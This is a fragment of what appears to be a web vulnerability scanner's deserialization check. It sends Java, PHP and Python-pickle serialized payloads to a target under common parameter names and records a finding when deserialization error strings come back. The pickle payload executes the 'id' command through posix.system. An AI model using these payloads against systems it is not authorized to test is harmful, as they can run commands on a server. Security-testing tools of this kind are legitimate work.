        """W11 #31 — Deserialization Deep v2."""
        if not self.deep: return
        self._print("[*]", "W11: Deser Deep v2...", "INFO")
        import base64
        # Java serialized magic bytes
        java_serial = base64.b64decode(b"rO0ABXNyABFqYXZhLnV0aWwuU2Nhbm5lcg==")
        # PHP serialized
        php_serial = b'O:4:"Test":1:{s:4:"test";s:4:"test";}'
        # Python pickle
        python_pickle = b"\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x02id\x94\x85\x94R\x94."
        params_list = [("data", java_serial), ("object", java_serial),
                        ("session", java_serial), ("data", php_serial),
                        ("input", php_serial), ("pickle", python_pickle),
                        ("data", python_pickle)]
        for param, payload in params_list:
            r = self._post(self.target, data={param: payload})
            if not r: continue
            if any(s in (r.text or "") for s in
                    ["ClassCastException", "ObjectInputStream",
                     "php_unserialize", "pickle.loads",
                     "TypeError: __init__", "readObject",
                     "ClassNotFoundException"]):
                self._add_vuln(f"W11 Deserialization: {param}",
                                "HIGH", self.target,
                                f"Deserialization triggered on {param}",
                                param=param)

